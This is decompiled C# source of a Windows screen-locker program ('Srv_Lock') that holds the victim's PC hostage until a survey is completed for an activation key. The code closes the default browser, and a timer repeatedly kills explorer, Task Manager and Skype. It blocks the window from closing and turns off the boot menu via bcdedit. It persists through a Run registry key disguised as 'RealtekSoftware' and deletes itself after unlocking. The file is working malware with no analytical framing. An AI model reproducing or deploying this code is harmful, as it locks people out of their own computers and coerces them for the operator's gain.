using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Srv_Lock.My;

namespace Srv_Lock;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("T")]
	private Label _T;

	[AccessedThroughProperty("LinkLabel1")]
	private LinkLabel _LinkLabel1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("param1")]
	private TextBox _param1;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("B1")]
	private Label _B1;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("B2")]
	private Label _B2;

	private string[] Settings;

	private string selfText;

	private string email;

	private string password;

	private string useSecure;

	private byte[] self;

	public string SL;

	public string UC;

	public string Title;

	public int FC;

	internal virtual PictureBox PictureBox1
	{
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual Label T
	{
		get
		{
			return _T;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_T = value;
		}
	}

	internal virtual LinkLabel LinkLabel1
	{
		get
		{
			return _LinkLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			LinkLabelLinkClickedEventHandler val = new LinkLabelLinkClickedEventHandler(LinkLabel1_LinkClicked);
			if (_LinkLabel1 != null)
			{
				_LinkLabel1.remove_LinkClicked(val);
			}
			_LinkLabel1 = value;
			if (_LinkLabel1 != null)
			{
				_LinkLabel1.add_LinkClicked(val);
			}
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox param1
	{
		get
		{
			return _param1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_param1 = value;
		}
	}

	internal virtual Label Label5
	{
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Label B1
	{
		get
		{
			return _B1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_B1 = value;
		}
	}

	internal virtual Label Label4
	{
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual Label B2
	{
		get
		{
			return _B2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_B2 = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Closing((CancelEventHandler)Form1_Closing);
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Expected O, but got Unknown
		//IL_03fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0408: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		T = new Label();
		LinkLabel1 = new LinkLabel();
		Button1 = new Button();
		param1 = new TextBox();
		Label5 = new Label();
		Timer1 = new Timer(components);
		B1 = new Label();
		Label4 = new Label();
		B2 = new Label();
		PictureBox1 = new PictureBox();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)T).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)T).set_ForeColor(Color.FromArgb(192, 0, 0));
		Label t = T;
		Point location = new Point(2, 2);
		((Control)t).set_Location(location);
		((Control)T).set_Name("T");
		Label t2 = T;
		Size size = new Size(537, 30);
		((Control)t2).set_Size(size);
		((Control)T).set_TabIndex(1);
		T.set_TextAlign((ContentAlignment)2);
		((Control)LinkLabel1).set_BackColor(Color.Transparent);
		LinkLabel linkLabel = LinkLabel1;
		location = new Point(363, 87);
		((Control)linkLabel).set_Location(location);
		((Control)LinkLabel1).set_Name("LinkLabel1");
		LinkLabel linkLabel2 = LinkLabel1;
		size = new Size(52, 17);
		((Control)linkLabel2).set_Size(size);
		((Control)LinkLabel1).set_TabIndex(3);
		((Label)LinkLabel1).set_TabStop(true);
		LinkLabel1.set_Text("HERE.");
		Button button = Button1;
		location = new Point(442, 197);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(90, 22);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(4);
		((ButtonBase)Button1).set_Text("Submit Key");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		TextBox obj = param1;
		location = new Point(95, 198);
		((Control)obj).set_Location(location);
		((Control)param1).set_Name("param1");
		TextBox obj2 = param1;
		size = new Size(341, 20);
		((Control)obj2).set_Size(size);
		((Control)param1).set_TabIndex(6);
		Label5.set_AutoSize(true);
		Label label = Label5;
		location = new Point(12, 201);
		((Control)label).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label2 = Label5;
		size = new Size(77, 13);
		((Control)label2).set_Size(size);
		((Control)Label5).set_TabIndex(10);
		Label5.set_Text("Activation key:");
		Timer1.set_Enabled(true);
		Label b = B1;
		location = new Point(146, 35);
		((Control)b).set_Location(location);
		((Control)B1).set_Name("B1");
		Label b2 = B1;
		size = new Size(386, 52);
		((Control)b2).set_Size(size);
		((Control)B1).set_TabIndex(11);
		Label4.set_AutoSize(true);
		Label label3 = Label4;
		location = new Point(146, 87);
		((Control)label3).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label4 = Label4;
		size = new Size(224, 13);
		((Control)label4).set_Size(size);
		((Control)Label4).set_TabIndex(12);
		Label4.set_Text("To get the key, complete a survey by clicking ");
		Label b3 = B2;
		location = new Point(146, 113);
		((Control)b3).set_Location(location);
		((Control)B2).set_Name("B2");
		Label b4 = B2;
		size = new Size(386, 52);
		((Control)b4).set_Size(size);
		((Control)B2).set_TabIndex(13);
		PictureBox1.set_Image((Image)componentResourceManager.GetObject("PictureBox1.Image"));
		PictureBox pictureBox = PictureBox1;
		location = new Point(12, 35);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(130, 130);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_TabIndex(0);
		PictureBox1.set_TabStop(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.Control);
		size = new Size(544, 231);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel1);
		((Control)this).get_Controls().Add((Control)(object)B2);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)B1);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)param1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)T);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Form1");
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form1_Closing(object sender, CancelEventArgs e)
	{
		e.Cancel = true;
		GC.Collect();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		self = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllBytes(Application.get_ExecutablePath());
		selfText = Encoding.Default.GetString(self);
		Settings = Strings.Split(selfText, "|sabre|", -1, (CompareMethod)0);
		SL = Settings[1];
		UC = Settings[2];
		T.set_Text(Settings[3]);
		B1.set_Text(Settings[4]);
		B2.set_Text(Settings[5]);
		Title = Settings[6];
		checkme();
		ShowDesktop();
		disableF8();
		starting();
		Process[] processesByName = Process.GetProcessesByName(defaultbrowser());
		try
		{
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public string defaultbrowser()
	{
		string text = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_CLASSES_ROOT\\HTTP\\shell\\open\\command", "", (object)"Not Found"));
		string[] array = Strings.Split(text, "\"", -1, (CompareMethod)0);
		return Path.GetFileNameWithoutExtension(array[1]);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(param1.get_Text(), UC, false) == 0)
		{
			MessageBox.Show("Thank you for completing the survey. Your PC is now unlocked and will return to normal after this message.", Title, (MessageBoxButtons)0, (MessageBoxIcon)64);
			Timer1.set_Enabled(false);
			enableF8();
			Process.Start("explorer");
			nostarting();
			autdestroy();
			ProjectData.EndApp();
		}
		else
		{
			MessageBox.Show("That key is invalid. Ensure you have entered it correctly.", Title, (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		Process[] processesByName = Process.GetProcessesByName("explorer");
		Process[] processesByName2 = Process.GetProcessesByName("taskmgr");
		Process[] processesByName3 = Process.GetProcessesByName("Skype");
		try
		{
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] array2 = processesByName2;
			foreach (Process process2 in array2)
			{
				process2.Kill();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] array3 = processesByName3;
			foreach (Process process3 in array3)
			{
				process3.Kill();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void LinkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		MyProject.Forms.Form2.WebBrowser1.Navigate(SL);
		((Control)MyProject.Forms.Form2).Show();
	}

	public void ShowDesktop()
	{
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("shell.application", ""));
		NewLateBinding.LateCall(objectValue, (Type)null, "MinimizeAll", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		objectValue = null;
	}

	public void disableF8()
	{
		try
		{
			Interaction.Shell("bcdedit /set {bootmgr} displaybootmenu no", (AppWinStyle)2, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void enableF8()
	{
		try
		{
			Interaction.Shell("bcdedit /set {bootmgr} displaybootmenu yes", (AppWinStyle)2, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void starting()
	{
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("RealtekSoftware", Application.get_ExecutablePath());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void nostarting()
	{
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")!.DeleteValue("RealtekSoftware", Conversions.ToBoolean(Application.get_ExecutablePath()));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void checkme()
	{
		if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length > 1)
		{
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void autdestroy()
	{
		Process.Start("cmd.exe", "/C ping 1.1.1.1 -n 2 -w 3000 > Nul & Del \"" + Application.get_ExecutablePath() + "\"");
		ProjectData.EndApp();
	}
}
